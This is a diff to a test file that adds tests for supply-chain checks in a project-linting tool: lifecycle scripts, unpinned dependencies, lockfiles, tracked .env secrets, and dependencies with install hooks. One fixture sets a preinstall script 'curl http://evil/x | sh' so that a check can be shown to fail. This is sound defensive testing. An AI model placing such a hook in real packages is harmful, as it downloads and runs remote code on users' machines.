@@ -14,6 +14,11 @@ import {
   functionBindingsCheck,
   entryPointCheck,
   typescriptBuildCheck,
+  lifecycleScriptsCheck,
+  unpinnedProdDepsCheck,
+  missingLockfileCheck,
+  trackedSecretFilesCheck,
+  installScriptDepsCheck,
   ALL_CHECKS,
 } from '../src/doctor/checks.js';
 
@@ -365,12 +370,211 @@ describe('typescript-build check', () => {
 // ── ALL_CHECKS ──
 
 describe('ALL_CHECKS registry', () => {
-  it('contains 13 checks', () => {
-    expect(ALL_CHECKS).toHaveLength(13);
+  it('contains 18 checks', () => {
+    expect(ALL_CHECKS).toHaveLength(18);
   });
 
   it('has unique IDs', () => {
     const ids = ALL_CHECKS.map(c => c.id);
     expect(new Set(ids).size).toBe(ids.length);
+  });
+});
+
+// ── Supply-chain: lifecycle-scripts ──
+
+describe('lifecycle-scripts check', () => {
+  it('passes when no forbidden scripts present', async () => {
+    const dir = makeTmp('chk-life-ok-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', scripts: { build: 'tsc', test: 'vitest' } },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await lifecycleScriptsCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
+  });
+
+  it('fails when postinstall is defined', async () => {
+    const dir = makeTmp('chk-life-postinstall-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', scripts: { postinstall: 'node ./hook.js' } },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await lifecycleScriptsCheck.run(ctx);
+    expect(results[0].status).toBe('fail');
+    expect(results[0].message).toContain('postinstall');
+  });
+
+  it('fails when preinstall is defined', async () => {
+    const dir = makeTmp('chk-life-preinstall-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', scripts: { preinstall: 'curl http://evil/x | sh' } },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await lifecycleScriptsCheck.run(ctx);
+    expect(results[0].status).toBe('fail');
+  });
+});
+
+// ── Supply-chain: unpinned-prod-deps ──
+
+describe('unpinned-prod-deps check', () => {
+  it('passes when all prod deps are pinned to exact versions', async () => {
+    const dir = makeTmp('chk-pin-ok-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: {
+        name: 'test',
+        dependencies: { '@azure/functions': '4.5.1' },
+      },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await unpinnedProdDepsCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
+  });
+
+  it('warns when prod deps use caret range', async () => {
+    const dir = makeTmp('chk-pin-caret-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: {
+        name: 'test',
+        dependencies: { '@azure/functions': '^4.5.1', axios: '^1.0.0' },
+      },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await unpinnedProdDepsCheck.run(ctx);
+    expect(results[0].status).toBe('warn');
+    expect(results[0].message).toContain('@azure/functions');
+  });
+
+  it('ignores devDependencies', async () => {
+    const dir = makeTmp('chk-pin-dev-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: {
+        name: 'test',
+        dependencies: { '@azure/functions': '4.5.1' },
+        devDependencies: { vitest: '^3.0.0' },
+      },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await unpinnedProdDepsCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
+  });
+});
+
+// ── Supply-chain: missing-lockfile ──
+
+describe('missing-lockfile check', () => {
+  it('passes when package-lock.json exists', async () => {
+    const dir = makeTmp('chk-lock-ok-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test' },
+    });
+    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ name: 'test', lockfileVersion: 3 }));
+    const ctx = await loadProjectContext(dir);
+    const results = await missingLockfileCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
+  });
+
+  it('warns when no lockfile present', async () => {
+    const dir = makeTmp('chk-lock-missing-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test' },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await missingLockfileCheck.run(ctx);
+    expect(results[0].status).toBe('warn');
+  });
+});
+
+// ── Supply-chain: tracked-secret-files ──
+
+describe('tracked-secret-files check', () => {
+  it('passes when no .env files exist', async () => {
+    const dir = makeTmp('chk-secret-none-');
+    scaffoldProject(dir, { hostJson: { version: '2.0' } });
+    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n');
+    const ctx = await loadProjectContext(dir);
+    const results = await trackedSecretFilesCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
+  });
+
+  it('fails when .env exists and is not gitignored', async () => {
+    const dir = makeTmp('chk-secret-untracked-');
+    scaffoldProject(dir, { hostJson: { version: '2.0' } });
+    writeFileSync(join(dir, '.env'), 'SECRET=topsecret\n');
+    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n');
+    const ctx = await loadProjectContext(dir);
+    const results = await trackedSecretFilesCheck.run(ctx);
+    expect(results[0].status).toBe('fail');
+    expect(results[0].severity).toBe('high');
+  });
+
+  it('passes when .env exists but is gitignored via wildcard', async () => {
+    const dir = makeTmp('chk-secret-ignored-');
+    scaffoldProject(dir, { hostJson: { version: '2.0' } });
+    writeFileSync(join(dir, '.env'), 'SECRET=topsecret\n');
+    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n.env*\n');
+    const ctx = await loadProjectContext(dir);
+    const results = await trackedSecretFilesCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
+  });
+});
+
+// ── Supply-chain: install-script-deps ──
+
+describe('install-script-deps check', () => {
+  it('skips when node_modules absent', async () => {
+    const dir = makeTmp('chk-inst-skip-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', dependencies: { axios: '1.0.0' } },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await installScriptDepsCheck.run(ctx);
+    expect(results[0].status).toBe('skip');
+  });
+
+  it('warns when a dep has postinstall', async () => {
+    const dir = makeTmp('chk-inst-warn-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', dependencies: { 'fake-dep': '1.0.0' } },
+    });
+    const depDir = join(dir, 'node_modules', 'fake-dep');
+    mkdirSync(depDir, { recursive: true });
+    writeFileSync(join(depDir, 'package.json'), JSON.stringify({
+      name: 'fake-dep',
+      version: '1.0.0',
+      scripts: { postinstall: 'node ./hook.js' },
+    }));
+    const ctx = await loadProjectContext(dir);
+    const results = await installScriptDepsCheck.run(ctx);
+    expect(results[0].status).toBe('warn');
+    expect(results[0].message).toContain('fake-dep');
+  });
+
+  it('passes when allowlisted native deps have install scripts (sharp)', async () => {
+    const dir = makeTmp('chk-inst-allow-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', dependencies: { sharp: '0.33.0' } },
+    });
+    const depDir = join(dir, 'node_modules', 'sharp');
+    mkdirSync(depDir, { recursive: true });
+    writeFileSync(join(depDir, 'package.json'), JSON.stringify({
+      name: 'sharp',
+      version: '0.33.0',
+      scripts: { install: 'node install/check' },
+    }));
+    const ctx = await loadProjectContext(dir);
+    const results = await installScriptDepsCheck.run(ctx);
+    expect(results[0].status).toBe('pass');
   });
 });
